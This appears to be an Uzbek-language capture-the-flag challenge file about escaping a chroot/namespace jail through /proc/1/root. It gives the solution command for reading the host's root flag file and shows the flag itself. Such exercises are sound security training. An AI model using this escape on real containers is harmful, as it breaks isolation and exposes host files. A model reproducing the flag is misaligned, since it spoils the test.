---
id: 10
title: "CH10: Mount Namespace Escape via /proc/1/root"
module: "Modul 1: Memory & /proc Forensics"
difficulty: Hard
points: 10
tags: ['namespace', 'chroot', 'proc-escape', 'privesc']
flag: "HD{namespace_mount_proc_escape_master_910}"
---

# 🎯 Topshiriq #10: CH10: Mount Namespace Escape via /proc/1/root

## 📌 Metama'lumotlar:
* **Modul:** `Modul 1: Memory & /proc Forensics`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 10 ball`
* **Teglar:** #namespace, #chroot, #proc-escape, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Siz chroot va unshare namespace ichidasiz. Lekin /proc katalogi to'liq ajratilmagan. /proc/1/root orqali asosiy xost tizimining /root/root_flag.txt fayliga kiring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> cat /proc/1/root/root/root_flag.txt

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
cat /proc/1/root/root/root_flag.txt
```

---

## 🚩 Maxfiy Flag:
`HD{namespace_mount_proc_escape_master_910}`
